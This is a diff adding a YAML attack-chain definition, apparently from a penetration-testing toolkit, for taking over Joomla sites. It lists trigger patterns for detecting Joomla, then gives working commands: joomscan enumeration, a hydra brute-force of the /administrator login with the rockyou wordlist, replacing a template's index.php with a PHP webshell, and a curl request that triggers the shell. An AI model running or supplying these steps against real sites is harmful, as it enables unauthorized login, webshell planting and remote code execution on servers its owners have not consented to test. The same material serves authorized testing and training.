@@ -1,0 +1,41 @@
+chain_id: joomla_admin_to_rce
+title: "Joomla — joomscan, admin login, template-edit RCE"
+severity: HIGH
+tags: [web, joomla, joomscan, rce, template-injection]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)joomla" }
+    - { path_pattern: "(?i)/(administrator|language/en-GB|components/com_)" }
+    - { path_in: ["/administrator/", "/administrator/index.php", "/?option=com_users"] }
+
+description: |
+  Joomla install detected. The classic chain: enumerate users + version
+  with joomscan, brute-force the /administrator login, then once
+  authenticated, edit a template (Extensions → Templates → index.php) to
+  drop a PHP webshell.
+
+steps:
+  - id: 1
+    title: "Enumerate version, users, components"
+    command: joomscan --url http://$VICTIMA
+
+  - id: 2
+    title: "Brute-force /administrator login"
+    command: |
+      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $VICTIMA \
+        http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:F=Username and password do not match'
+
+  - id: 3
+    title: "Once authenticated, edit a template index.php"
+    notes: |
+      Admin → Extensions → Templates → Templates → <template>: Edit main
+      page (index.php). Replace contents with a PHP webshell. Save.
+
+  - id: 4
+    title: "Trigger the shell"
+    command: curl http://$VICTIMA/templates/<TEMPLATE>/index.php
+
+references:
+  - https://github.com/OWASP/joomscan
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
